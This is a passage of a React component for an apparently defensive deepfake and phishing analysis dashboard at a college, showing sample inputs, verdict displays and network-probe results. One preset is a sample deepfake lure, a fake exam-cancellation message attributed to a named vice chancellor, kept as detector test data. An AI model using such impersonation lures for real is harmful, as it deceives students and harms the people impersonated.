                    target_authority: 'Prof. Chittaranjan Tripathy (Vice Chancellor)',
                    transcript: 'Dear students of PMEC Berhampur, due to state-wide administrative irregularities, all BPUT semester examinations scheduled for this week are cancelled indefinitely.',
                    category: 'malicious'
                  })}
                  className="px-2.5 py-1 rounded text-xs font-medium bg-[#06080F] text-rose-400 border border-rose-500/30 hover:bg-slate-800 transition-colors"
                >
                  Exam Cancel Video (Face-Swap)
                </button>
                <button
                  type="button"
                  onClick={() => setDeepfakeInput({
                    modality: 'audio',
                    title: 'Authentic Voice: Registrar Official Convocation Address',
                    target_authority: 'Dr. Rashmi Rekha Sahoo (Registrar)',
                    transcript: 'Welcome faculty members, esteemed guests, and graduating engineers to the fourteenth annual convocation ceremony of Parala Maharaja Engineering College.',
                    category: 'benign'
                  })}
                  className="px-2.5 py-1 rounded text-xs font-medium bg-[#06080F] text-emerald-400 border border-emerald-500/30 hover:bg-slate-800 transition-colors"
                >
                  Registrar Voice (Authentic)
                </button>
              </div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              <div>
                <label className="block text-xs text-slate-400 mb-1">Modality Vector:</label>
                <div className="flex items-center gap-1 bg-[#06080F] p-1 rounded-lg border border-slate-700/80">
                  <button
                    type="button"
                    onClick={() => setDeepfakeInput({ ...deepfakeInput, modality: 'audio' })}
                    className={`flex-1 py-1 text-xs rounded font-medium flex items-center justify-center gap-1 transition-colors ${
                      deepfakeInput.modality === 'audio' ? 'bg-sky-600 text-white shadow-sm' : 'text-slate-400 hover:text-white'
                    }`}
                  >
                    <Mic className="w-3 h-3" />
                    <span>Audio Speech</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => setDeepfakeInput({ ...deepfakeInput, modality: 'video' })}
                    className={`flex-1 py-1 text-xs rounded font-medium flex items-center justify-center gap-1 transition-colors ${
                      deepfakeInput.modality === 'video' ? 'bg-indigo-600 text-white shadow-sm' : 'text-slate-400 hover:text-white'
                    }`}
                  >
                    <Video className="w-3 h-3" />
                    <span>Video Clip</span>
                  </button>
                </div>
              </div>

              <div>
                <label className="block text-xs text-slate-400 mb-1">Target Institutional Identity:</label>
                <input
                  type="text"
                  value={deepfakeInput.target_authority}
                  onChange={e => setDeepfakeInput({ ...deepfakeInput, target_authority: e.target.value })}
                  className="w-full px-3 py-2 bg-[#06080F] border border-slate-700/80 rounded-lg text-xs text-white focus:outline-none focus:border-sky-500"
                />
              </div>

              <div>
                <label className="block text-xs text-slate-400 mb-1">Payload Title / Label:</label>
                <input
                  type="text"
                  value={deepfakeInput.title}
                  onChange={e => setDeepfakeInput({ ...deepfakeInput, title: e.target.value })}
                  className="w-full px-3 py-2 bg-[#06080F] border border-slate-700/80 rounded-lg text-xs text-white focus:outline-none focus:border-sky-500"
                />
              </div>
            </div>

            <div>
              <label className="block text-xs text-slate-400 mb-1">Spoken Speech Transcript / Lure Narrative:</label>
              <textarea
                rows={3}
                value={deepfakeInput.transcript}
                onChange={e => setDeepfakeInput({ ...deepfakeInput, transcript: e.target.value })}
                className="w-full p-3 bg-[#06080F] border border-slate-700/80 rounded-lg text-xs text-white focus:outline-none focus:border-sky-500 font-mono"
              />
            </div>

            {onNavigateToDeepfake && (
              <div className="p-3 bg-sky-950/20 border border-sky-500/30 rounded-lg flex items-center justify-between text-xs">
                <span className="text-sky-300">
                  Want real-time interactive canvas spectrograms, rPPG pulse waveforms, and 68-point facial mesh inspection?
                </span>
                <button
                  type="button"
                  onClick={onNavigateToDeepfake}
                  className="px-3 py-1.5 bg-sky-600 hover:bg-sky-500 text-white rounded font-medium flex items-center gap-1 transition-colors shrink-0 shadow-sm"
                >
                  <span>Launch Deepfake Lab</span>
                  <ArrowUpRight className="w-3.5 h-3.5" />
                </button>
              </div>
            )}
          </div>
        )}

        {/* Action Controls */}
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-3 border-t border-slate-800">
          <span className="text-xs text-slate-400">
            Automated verification against institutional security rules
          </span>

          <button
            onClick={handleAnalyze}
            disabled={isAnalyzing}
            className="w-full sm:w-auto px-5 py-2.5 text-xs font-semibold rounded-lg bg-white hover:bg-slate-200 text-[#08090D] transition-all disabled:opacity-50 flex items-center justify-center gap-2 min-h-[40px] shadow-sm active:scale-95"
          >
            <Send className="w-3.5 h-3.5" />
            <span>{isAnalyzing ? 'Evaluating heuristics...' : `Analyze ${activeMode.toUpperCase()} Vector`}</span>
          </button>
        </div>
      </div>

      {error && (
        <div className="p-4 bg-rose-950/40 border border-rose-500/40 rounded-xl text-rose-300 text-xs flex items-center gap-2">
          <AlertCircle className="w-4 h-4 shrink-0" />
          <span>{error}</span>
        </div>
      )}

      {/* Analysis Output Results Container */}
      {analysisResult && (
        <div className="space-y-6 pt-2">
          {/* Pipeline Verification Indicator */}
          <PipelineIndicator currentStage={6} />

          {/* Model Inference Telemetry Strip */}
          <div className="bg-[#0D121F] border border-slate-800 p-3.5 sm:p-4 rounded-xl flex flex-wrap items-center justify-between gap-3 text-xs shadow-sm">
            <div className="flex flex-wrap items-center gap-2.5">
              <span className="text-slate-400">Inference Architecture:</span>
              <span className="font-semibold text-white font-mono bg-[#06080F] px-2 py-0.5 rounded border border-slate-800">
                {modelInfo?.engine || (selectedEngine === 'hybrid' ? 'gemini-3.8-flash-hybrid' : selectedEngine)}
              </span>
              <span className="text-slate-600">·</span>
              <span className="text-slate-400">Execution Latency:</span>
              <span className="font-mono text-amber-400 tabular-nums font-semibold">
                {modelInfo?.latency_ms ? `${modelInfo.latency_ms.toFixed(1)} ms` : '< 2.5 ms'}
              </span>
              <span className="text-slate-600">·</span>
              <span className="text-slate-400">Target User:</span>
              <span className="font-mono text-slate-300">student042@pmec.ac.in</span>
            </div>
            <span className="text-emerald-400 font-medium text-[11px] flex items-center gap-1.5 shrink-0">
              <CheckCircle2 className="w-3.5 h-3.5" />
              Verified Institutional Trust Grounding
            </span>
          </div>

          {/* Verdict Overview Banner - iOS Glass Card */}
          <div className="ios-glass-card rounded-[26px] p-6 sm:p-8 shadow-2xl">
            <div className="flex flex-col md:flex-row md:items-center justify-between gap-6">
              <div className="space-y-2.5">
                <div className="flex flex-wrap items-center gap-2 text-xs">
                  <span className="text-slate-400 font-medium">
                    Verdict:
                  </span>
                  <SeverityBadge severity={analysisResult.severity} />
                  <span aria-hidden="true" className="text-slate-600">·</span>
                  <span className="text-slate-300 font-medium capitalize">
                    {(analysisResult.classification || '').replace(/_/g, ' ')}
                  </span>
                  {analysisResult.verdict && (
                    <span className={`px-2 py-0.5 rounded text-[10px] font-mono border ${
                      analysisResult.verdict === 'MANIPULATED_DEEPFAKE'
                        ? 'bg-rose-950/60 text-rose-300 border-rose-500/40'
                        : 'bg-emerald-950/60 text-emerald-300 border-emerald-500/40'
                    }`}>
                      {analysisResult.verdict}
                    </span>
                  )}
                </div>
                <h3 className="text-lg font-semibold text-white tracking-tight">
                  {analysisResult.summary || analysisResult.threat_rationale}
                </h3>
                <p className="text-xs text-slate-300">
                  Confidence score: <strong className="text-white font-mono">{((analysisResult.confidence || 0.95) * 100).toFixed(1)}%</strong> · Verified against <strong className="text-white font-mono">{analysisResult.indicators?.length || 0}</strong> indicators
                </p>
                <div className="pt-2 flex flex-wrap items-center gap-2.5">
                  <button
                    onClick={handleCopyReport}
                    className="px-3 py-1.5 text-xs font-medium rounded-lg bg-[#06080F] border border-slate-700/80 text-slate-300 hover:text-white flex items-center gap-1.5 transition-colors"
                  >
                    <Copy className="w-3.5 h-3.5 text-slate-400" />
                    <span>{copiedReport ? 'Report JSON Copied' : 'Copy Forensic Report'}</span>
                  </button>

                  {createdEvent?.incident_id && onNavigateToIncident && (
                    <button
                      onClick={() => onNavigateToIncident(createdEvent.incident_id!)}
                      className="px-3 py-1.5 text-xs font-medium rounded-lg bg-sky-600 hover:bg-sky-500 text-white flex items-center gap-1.5 transition-colors shadow-sm"
                    >
                      <Layers className="w-3.5 h-3.5" />
                      <span>View in Digital Trust Topology ({createdEvent.incident_id}) →</span>
                    </button>
                  )}
                </div>
              </div>

              <div className="shrink-0 self-center md:self-auto">
                <RiskGauge
                  score={analysisResult.risk_score}
                  severity={analysisResult.severity}
                  size="lg"
                />
              </div>
            </div>

            {/* Deepfake Specific Gauges Strip */}
            {(analysisResult.audio_metrics || analysisResult.video_metrics) && (
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 pt-4 mt-4 border-t border-slate-800 text-xs">
                {analysisResult.audio_metrics && (
                  <>
                    <div className="p-2.5 bg-[#060811] rounded-lg border border-slate-800">
                      <span className="text-[10px] text-slate-400 block">F0 Pitch Jitter</span>
                      <span className="font-mono font-bold text-white text-sm">
                        {analysisResult.audio_metrics.pitch_jitter_pct}%
                      </span>
                    </div>
                    <div className="p-2.5 bg-[#060811] rounded-lg border border-slate-800">
                      <span className="text-[10px] text-slate-400 block">Synthetic Probability</span>
                      <span className="font-mono font-bold text-rose-400 text-sm">
                        {analysisResult.audio_metrics.synthetic_voice_probability}%
                      </span>
                    </div>
                  </>
                )}
                {analysisResult.video_metrics && (
                  <>
                    <div className="p-2.5 bg-[#060811] rounded-lg border border-slate-800">
                      <span className="text-[10px] text-slate-400 block">rPPG Blood Flow Pulse</span>
                      <span className="font-mono font-bold text-emerald-400 text-sm">
                        {analysisResult.video_metrics.rppg_liveness_pulse_bpm} BPM
                      </span>
                    </div>
                    <div className="p-2.5 bg-[#060811] rounded-lg border border-slate-800">
                      <span className="text-[10px] text-slate-400 block">Boundary Latent Warp</span>
                      <span className="font-mono font-bold text-white text-sm">
                        {analysisResult.video_metrics.boundary_warp_artifact_score}/100
                      </span>
                    </div>
                  </>
                )}
              </div>
            )}
          </div>

          {/* Real Live Network Probe Findings Card */}
          {(analysisResult.features?.live_probe || analysisResult.url_analysis?.features?.live_probe) && (() => {
            const probe = analysisResult.features?.live_probe || analysisResult.url_analysis?.features?.live_probe;
            return (
              <div className="bg-[#0A0D15] border border-white/10 rounded-xl p-5 space-y-3 text-xs shadow-sm">
                <div className="flex items-center justify-between pb-2 border-b border-white/10">
                  <div className="flex items-center gap-2">
                    <Network className="w-4 h-4 text-sky-400" />
                    <span className="font-bold text-white">Live Network Probe & Connectivity Telemetry</span>
                  </div>
                  <span className={`px-2 py-0.5 rounded text-[10px] font-mono border ${
                    probe.is_reachable 
                      ? 'bg-emerald-950/60 text-emerald-300 border-emerald-500/40' 
                      : 'bg-rose-950/60 text-rose-300 border-rose-500/40'
                  }`}>
                    {probe.is_reachable ? `HTTP ${probe.status_code || 200} ONLINE` : 'HOST UNREACHABLE'}
                  </span>
                </div>

                <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-[11px]">
                  <div className="p-3 bg-[#05070C] rounded-lg border border-white/5 space-y-1">
                    <div className="text-slate-400">Transport Security</div>
                    <div className="flex items-center gap-1.5 font-bold font-mono">
                      {probe.has_https ? (
                        <>
                          <Lock className="w-3.5 h-3.5 text-emerald-400" />
                          <span className="text-emerald-400">HTTPS (TLS)</span>
                        </>
                      ) : (
                        <>
                          <Unlock className="w-3.5 h-3.5 text-rose-400" />
                          <span className="text-rose-400">Insecure HTTP</span>
                        </>
                      )}
                    </div>
                  </div>

                  <div className="p-3 bg-[#05070C] rounded-lg border border-white/5 space-y-1">
                    <div className="text-slate-400">DNS & Latency</div>
                    <div className="font-bold font-mono text-white">
                      {probe.latency_ms ? `${probe.latency_ms} ms` : 'N/A'}
                    </div>
                  </div>

                  <div className="p-3 bg-[#05070C] rounded-lg border border-white/5 space-y-1">
                    <div className="text-slate-400">HSTS Policy</div>
                    <div className={`font-bold font-mono ${probe.hsts_enabled ? 'text-emerald-400' : 'text-amber-400'}`}>
                      {probe.hsts_enabled ? 'Enforced' : 'Not Enforced'}
                    </div>
                  </div>

                  <div className="p-3 bg-[#05070C] rounded-lg border border-white/5 space-y-1">
                    <div className="text-slate-400">Discovered Forms</div>
                    <div className={`font-bold font-mono ${probe.has_password_field ? 'text-rose-400' : 'text-slate-200'}`}>
                      {probe.has_password_field ? 'Password Field Present' : `${probe.form_action_destinations?.length || 0} Forms`}
                    </div>
                  </div>
                </div>

                {probe.page_title && (
                  <div className="text-[11px] text-slate-300 bg-[#05070C] px-3 py-2 rounded border border-white/5">
                    <span className="text-slate-400">Live HTML Page Title:</span> <strong className="text-white font-medium">"{probe.page_title}"</strong>
                  </div>
                )}

                {probe.error && (
                  <div className="text-[11px] text-rose-300 bg-rose-950/30 p-2.5 rounded border border-rose-500/30">
                    <strong>Network Error:</strong> {probe.error}
                  </div>
                )}
              </div>
            );
          })()}

          {/* Evidence Layer */}
          <div className="space-y-3">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-1">
              <h2 className="text-sm font-semibold text-white">
                Verifiable Evidence Breakdown
              </h2>
              <span className="text-xs text-slate-400">
                Deterministic security rules and heuristic weights
              </span>
            </div>

            <EvidenceTable indicators={analysisResult.indicators || []} />
          </div>

          {/* Recommended Responses */}
          {createdEvent && createdEvent.recommended_actions.length > 0 && (
            <div className="bg-[#0D121F] border border-slate-800 p-5 rounded-xl space-y-2.5 shadow-sm">
              <div className="text-xs font-semibold text-slate-300">
                Recommended Containment Actions:
              </div>
              <div className="flex flex-wrap gap-2 text-xs">
                {createdEvent.recommended_actions.map((action, idx) => (
                  <span
                    key={`${action}-${idx}`}
                    className="px-3 py-1.5 rounded-lg bg-[#06080F] text-slate-200 border border-slate-800 capitalize font-mono"
                  >
                    {action.replace(/_/g, ' ')}
                  </span>
                ))}
              </div>
            </div>
          )}
        </div>
      )}

      {/* Real Live Camera QR Scanner Modal */}
      <LiveWebcamScanner
        isOpen={isWebcamOpen}
        onClose={() => setIsWebcamOpen(false)}
        onCodeDetected={(code) => {
          setQrInput(code);
          setQrDecodeStatus(`Decoded live from webcam: "${code}"`);
        }}
      />
    </div>
  );
};
